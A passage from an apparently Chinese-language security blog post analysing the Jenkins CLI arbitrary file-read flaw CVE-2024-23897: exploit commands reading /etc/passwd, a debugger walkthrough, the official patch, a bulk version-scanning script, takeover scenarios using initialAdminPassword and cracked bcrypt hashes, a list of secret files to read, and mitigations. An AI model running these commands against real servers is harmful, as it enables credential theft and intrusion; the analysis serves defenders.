<p>使用其他命令时只能读取第一行文件内容，如使用who-am-i &#x2F; restart &#x2F; shutdown &#x2F; safe-shutdown &#x2F; disable-jobenable-job<br>java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> who-am-i  @&#x2F;etc&#x2F;passwd<br><img src="image-20240201174026495.png" alt="image-20240201174026495" style="zoom: 100%;folat:left" /></p>
<p>但使用keep-build命令时，能读取文件第3行的内容<br>java -jar jenkins-cli.jar -s <a target="_blank" rel="noopener" href="http://127.0.0.1:8082/">http://127.0.0.1:8082</a> keep-build  @&#x2F;etc&#x2F;passwd<br><img src="/image-20240201184805453.png" alt="image-20240201184805453"></p>
<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><blockquote>
<p>Version：jenkins2.441</p>
</blockquote>
<p>开启5005端口远程调试，在src&#x2F;main&#x2F;java&#x2F;hudson&#x2F;cli&#x2F;CLICommand.java&#x2F;hudson&#x2F;cli&#x2F;CLICommand#getCmdLineParser处下断点</p>
<p><img src="/image-20240326172421384.png" alt="image-20240326172421384"></p>
<p>运行Payload<br>java -jar .\jenkins-cli.jar -s “<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a>“ who-am-i “@&#x2F;etc&#x2F;passwd”	</p>
<p><img src="/image-20240329105445054.png" alt="image-20240329105445054"></p>
<p>走到解析命令行参数位置org.kohsuke.args4j.CmdLineParser#parseArgument(java.lang.String…)</p>
<p><img src="/image-20240329105539742.png" alt="image-20240329105539742"></p>
<p>可以看到将我们要读取的文件@&#x2F;etc&#x2F;passwd作为命令的参数传入</p>
<p><img src="/image-20240329114529941.png" alt="image-20240329114529941"></p>
<p>继续走下去，<code>this.parserProperties.getAtSyntax()</code>做了一个逻辑判断，<code>getAtSyntax</code>默认是true的，所以跟入if判断</p>
<p><img src="/image-20240329114638405.png" alt="image-20240329114638405"></p>
<p>跟进<code>org.kohsuke.args4j.CmdLineParser#expandAtFiles</code>函数，Jenkins 安全团队也是通过添加安全配置修补了 CVE-2024-23897，该配置禁用了“ <a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j/blob/master/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L478">expandAtFiles</a> ”功能，该函数是将参数<code>@/etc/passwd</code>传入，提取有效部分<code>/etc/passwd</code>，<code>readAllLines(file)</code>读取文件。</p>
<p><img src="/image-20240329115857540.png" alt="image-20240329115857540"></p>
<p>跟进<code>org.kohsuke.args4j.CmdLineParser#readAllLines</code>可以看到<br>将传入的payload作为参数添加到数组给<code>readline()</code>一行一行读取文件</p>
<p><img src="/image-20240326184436528.png" alt="image-20240326184436528"></p>
<p>跳回到<code>org.kohsuke.args4j.CmdLineParser#parseArgument</code>函数，可以看到这里会抛出一个错误msg</p>
<p><img src="/image-20240329122431736.png" alt="image-20240329122431736"></p>
<p>跟进<code>org.kohsuke.args4j.CmdLineException#CmdLineException</code>函数可以看到报错的具体内容是拼接读取的文件内容</p>
<p><img src="/image-20240329122617776.png" alt="image-20240329122617776"></p>
<h3 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h3><p><a target="_blank" rel="noopener" href="https://github.com/jenkinsci/jenkins/commit/554f03782057c499c49bbb06575f0d28b5200edb?diff=split&w=0">Commit：[SECURITY-3314]</a></p>
<p><img src="/image-20240330045636284.png" alt="image-20240330045636284"></p>
<p>补丁说明：</p>
<ol>
<li><strong>新增了对命令行参数的处理逻辑：</strong><ul>
<li>修复后的代码为 <code>CLICommand.java</code> 中的 <code>getCmdLineParser</code> 方法新增了一个 <code>ParserProperties</code> 对象，并通过 <code>ParserProperties.defaults().withAtSyntax(ALLOW_AT_SYNTAX)</code> 设置了参数的解析属性，其中 <code>ALLOW_AT_SYNTAX</code> 是一个布尔值，用于控制是否允许解析命令行参数中的 <code>@</code> 前缀。这样做的目的是防止恶意用户利用 <code>@</code> 前缀绕过权限控制。</li>
<li>同样地，在 <code>CLIRegisterer.java</code> 中的 <code>getCmdLineParser</code> 方法中也做了类似的处理，通过 <code>ParserProperties.defaults().withAtSyntax(ALLOW_AT_SYNTAX)</code> 设置了命令行参数的解析属性。</li>
</ul>
</li>
<li><strong>修改了命令行参数解析器的构造方法：</strong><ul>
<li>修复后的代码中，在 <code>CLICommand.java</code> 中的 <code>getCmdLineParser</code> 方法和 <code>CLIRegisterer.java</code> 中的 <code>getCmdLineParser</code> 方法，都修改了 <code>CmdLineParser</code> 对象的构造方式，将之前直接传入命令行对象改为传入了一个 <code>ParserProperties</code> 对象，从而确保了参数解析的安全性。</li>
</ul>
</li>
</ol>
<p>通过以上修复措施，代码确保了在处理命令行参数时，不再解析带有 <code>@</code> 前缀的参数，从而防止了CVE-2024-23897安全漏洞。</p>
<h2 id="漏洞批量检测-amp-利用"><a href="#漏洞批量检测-amp-利用" class="headerlink" title="漏洞批量检测&amp;利用"></a>漏洞批量检测&amp;利用</h2><h3 id="版本识别原理"><a href="#版本识别原理" class="headerlink" title="版本识别原理"></a>版本识别原理</h3><p>通过Jenkins API检测Jenkins的版本，请求此接口：&#x2F;api&#x2F;python，查看请求包X-Jenkins的值，X-Jenkins的值即Jenkins版本号</p>
<p><img src="/image-20240126181651217.png" alt="image-20240126181651217"></p>
<h3 id="批量版本检测"><a href="#批量版本检测" class="headerlink" title="批量版本检测"></a>批量版本检测</h3><p>单个url识别：python main.py  -u  <a target="_blank" rel="noopener" href="http://ip:8080/">http://ip:8080</a></p>
<p><img src="/image-20240127170004652.png" alt="image-20240127170004652"></p>
<p>批量url识别：python main.py  -f  url.txt</p>
<p><img src="/image-20240127170806937.png" alt="image-20240127170806937"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_jenkins_version</span>(<span class="params">url</span>):</span><br><span class="line">    jenkins_python_api_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/python&quot;</span></span><br><span class="line">    response = requests.get(jenkins_python_api_url, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> response.headers.get(<span class="string">&#x27;x-jenkins&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visualize_versions</span>(<span class="params">urls, versions</span>):</span><br><span class="line">    <span class="comment"># 使用水平条形图，更清晰地显示版本号</span></span><br><span class="line">    plt.barh(urls, versions, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;Jenkins Version Check&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;Jenkins Version Check&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加版本号标签</span></span><br><span class="line">    <span class="keyword">for</span> i, version <span class="keyword">in</span> <span class="built_in">enumerate</span>(versions):</span><br><span class="line">        plt.text(version, i, <span class="built_in">str</span>(version))</span><br><span class="line"></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Jenkins 版本号识别脚本&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;单个 Jenkins URL 进行识别&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;包含多个 Jenkins URLs 的文件进行识别&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        url = args.url</span><br><span class="line">        version = get_jenkins_version(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> 的 Jenkins 版本号: <span class="subst">&#123;version&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> args.file:</span><br><span class="line">        file_path = args.file</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            urls = file.read().splitlines()</span><br><span class="line"></span><br><span class="line">        versions = [get_jenkins_version(url) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, url <span class="keyword">in</span> <span class="built_in">enumerate</span>(urls):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> 的 Jenkins 版本号: <span class="subst">&#123;versions[i]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        visualize_versions(urls, versions)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请提供单个 URL (-u) 或包含多个 URL 的文件 (-f)。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>Nuclei：<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/main/javascript/cves/2024/CVE-2024-23897.yaml">CVE-2024-23897</a> </p>
<p><img src="/image-20240330041754003.png" alt="image-20240330041754003"></p>
<h3 id="实战场景利用"><a href="#实战场景利用" class="headerlink" title="实战场景利用"></a>实战场景利用</h3><p>利用工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/godylockz/CVE-2024-23897">exploit CVE-2024-23897</a>        <a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI">JenkinsExploit-GUI</a></p>
<h5 id="场景1-解锁Jenkins"><a href="#场景1-解锁Jenkins" class="headerlink" title="场景1  解锁Jenkins"></a>场景1  解锁Jenkins</h5><p>Jenkins搭建完成后首次登录需要定义管理员账户，定义过程中需要输入initialAdminPassword值，遇到这种未定义用户的情况直接读取initialAdminPassword值解锁Jenkins定义管理员账户</p>
<p><img src="/image-20240326145617117.png" alt="image-20240326145617117"></p>
<p>读取&#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword，输入initialAdminPassword的值创建管理员账户进入Jenkins后台</p>
<p><img src="/image-20240326150201154.png" alt="image-20240326150201154"></p>
<p>进入后台命令执行</p>
<p><img src="/image-20240327021444616.png" alt="image-20240327021444616"></p>
<h5 id="场景2-Jenkins登录"><a href="#场景2-Jenkins登录" class="headerlink" title="场景2  Jenkins登录"></a>场景2  Jenkins登录</h5><p>想要通过文件读取的方式读到用户名密码从而进入Jenkins后台，这里参考P牛的文章中读取用户密码文件利用，当Jenkins开启了“匿名用户可读”选项，尝试读取&#x2F;var&#x2F;jenkins_home&#x2F;users&#x2F;users.xml获取用户列表和每个用户信息所在的文件目录</p>
<p><img src="/image-20240330024025133.png" alt="image-20240330024025133"></p>
<p>再读取admin用户所在目录下的config文件&#x2F;var&#x2F;jenkins_home&#x2F;users&#x2F;admin_3299375678914649777&#x2F;config.xml<br>得到使用JBCript哈希编码的用户密码</p>
<p><img src="/image-20240330043547620.png" alt="image-20240330043547620"></p>
<p>比如读取到密码是：#jbcrypt:$2a$10$nBw4rnEH8S4sK5aSdwC7tui3l5&#x2F;3Sa&#x2F;P5D8OHjKV40xezl2b1VBk2，我创建的管理员密码是abc123，删除前缀#jbcrypt:，使用Bcrypt哈希验证密码是否一致</p>
<img src="image-20240330025822587.png" alt="image-20240330025822587"  />

<p>可以看到哈希值和明文配对成功，确实是使用BCript哈希编码的密码。那么得到了密码，接下来就是BCript哈希爆破</p>
<p><a target="_blank" rel="noopener" href="https://bcrypt.online/">Bcrypt 哈希验证器</a>           <a target="_blank" rel="noopener" href="https://gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar">Bcrypt爆破工具下载</a></p>
<p><img src="/image-20240330031638065.png" alt="image-20240330031638065"></p>
<p>进入后台接下来就是后渗透，Jenkins后渗透利用参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/q5A4APOPnGNo4zjulv0ugQ">浅谈jenkins后渗透</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vpS1rIRm0mkxSb4Vlq-56g">Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙</a></li>
</ul>
<p>更多可利用文件读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts #Linux本地DNS解析。</span><br><span class="line">/etc/passwd #Linux用户账户。</span><br><span class="line">/proc/self/environ #包括环境变量，包括JENKINS_HOME。</span><br><span class="line">/proc/self/cmdline #命令行参数。</span><br><span class="line">/var/jenkins_home/users/users.xml #用户账户存储位置。</span><br><span class="line">/var/jenkins_home/users/&lt;user_directory&gt;/config.xml #用户信息、用户BCrypt密码哈希、seed值、Token。</span><br><span class="line">/var/jenkins_home/secret.key #保存Remember-Me Cookie中的一部分</span><br><span class="line">/var/jenkins_home/secrets/master.key #作为AES解密密钥</span><br><span class="line">/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac #作为计算hmac签名时的Key</span><br></pre></td></tr></table></figure>

<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方已发布修复方案，受影响的用户建议更新至安全版本：<a target="_blank" rel="noopener" href="https://www.jenkins.io/download/">https://www.jenkins.io/download/</a></p>
<p><img src="/image-20240327014407390.png" alt="image-20240327014407390"></p>
<h3 id="过渡方案"><a href="#过渡方案" class="headerlink" title="过渡方案"></a>过渡方案</h3><p>如果无法立即升级到 Jenkins 2.442、LTS 2.426.3，可以使用一些解决方法来减轻部分或全部影响：</p>
<ul>
<li>禁用 CLI 访问<br>禁用对 CLI 的访问将完全防止利用，对于无法立即更新的管理员来说，这是建议的解决方法。应用此解决方法不需要重新启动 Jenkins。有关说明，请参阅<a target="_blank" rel="noopener" href="https://github.com/jenkinsci-cert/SECURITY-3314-3315/">此解决方法的文档</a>。</li>
<li>使用反向代理阻止 WebSocket 访问<br>如果 Jenkins 只能通过反向代理访问，请配置该代理以通过不升级请求来阻止通过 WebSocket 访问 CLI。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>CVE-2024-23897漏洞的利用有下面两个比较核心的限制：</p>
<ul>
<li>是否开启“匿名用户可读”选项，这个选项决定了是否能够读取文件全部内容</li>
<li>服务端字符集是否兼容读取二进制文件（限制详情分析推荐看P牛的文章）</li>
</ul>
</li>
<li><p>在漏洞原理分析中，当使用参数调用 CLI 命令时，我们注意到 Jenkins 使用<a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j">args4j 的</a> <a target="_blank" rel="noopener" href="https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/cli/CLICommand.java#L248">parseArgument</a>，它<a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j/blob/master/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L479">调用</a> <a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j/blob/master/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L548">ExpandAtFiles</a>，该函数检查参数是否以 <code>@ </code>字符开头，如果是，则读取<code>@</code>之后的路径中的文件，并为每一行扩展一个新参数。</p>
</li>
<li><p>漏洞检测、实际的利用场景介绍</p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.jenkins.io/security/advisory/2024-01-24/">https://www.jenkins.io/security/advisory/2024-01-24/</a></li>
<li><a target="_blank" rel="noopener" href="http://www.openwall.com/lists/oss-security/2024/01/24/6">http://www.openwall.com/lists/oss-security/2024/01/24/6</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jenkinsci/jenkins/commit/554f03782057c499c49bbb06575f0d28b5200edb?diff=split&w=0">Jenkins SECURITY-3314官方补丁</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/godylockz/CVE-2024-23897">exploit CVE-2024-23897</a>  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/TheBeastofwar/JenkinsExploit-GUI">JenkinsExploit-GUI</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">Jenkins文件读取漏洞拾遗（CVE-2024-23897）</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/q5A4APOPnGNo4zjulv0ugQ">浅谈jenkins后渗透</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vpS1rIRm0mkxSb4Vlq-56g">Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙</a></li>
</ul>
<blockquote>
<p>文章存在错误或者不足的地方，请大佬指正！</p>
</blockquote>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/happy/">Happy</a></li>
         
          <li><a href="/tag/">Tag</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/kpi/">Kpi</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E8%B0%88CVE-2024-23897-Jenkins-CLI%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">浅谈CVE-2024-23897-Jenkins CLI任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">利用限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%B5%8B%E7%BB%98"><span class="toc-number">1.2.</span> <span class="toc-text">资产测绘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">Jenkins测试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.1.</span> <span class="toc-text">Windows系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.2.</span> <span class="toc-text">Linux系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.3.</span> <span class="toc-text">Docker环境搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81"><span class="toc-number">1.5.2.</span> <span class="toc-text">官方补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B-amp-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞批量检测&amp;利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">版本识别原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">批量版本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.6.3.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.4.</span> <span class="toc-text">实战场景利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1-%E8%A7%A3%E9%94%81Jenkins"><span class="toc-number">1.6.4.0.1.</span> <span class="toc-text">场景1  解锁Jenkins</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2-Jenkins%E7%99%BB%E5%BD%95"><span class="toc-number">1.6.4.0.2.</span> <span class="toc-text">场景2  Jenkins登录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%B8%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.7.1.</span> <span class="toc-text">过渡方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.9.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&text=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&is_video=false&description=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=浅谈CVE-2024-23897-Jenkins CLI任意文件读取&body=Check out this article: https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&title=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&name=浅谈CVE-2024-23897-Jenkins CLI任意文件读取&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2024/03/31/Jenkins%20CLI%20FileRead-(CVE-2024-23897)/&t=浅谈CVE-2024-23897-Jenkins CLI任意文件读取"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">

  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Bealee
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">Home</a></li><!--
    --><!--
      --><li><a href="/archives/">Writing</a></li><!--
    --><!--
      --><li><a href="/happy/">Happy</a></li><!--
    --><!--
      --><li><a href="/tag/">Tag</a></li><!--
    --><!--
      --><li><a href="/search/">Search</a></li><!--
    --><!--
      --><li><a href="/kpi/">Kpi</a></li><!--
    --><!--
      --><li><a href="/about/">About</a></li><!--
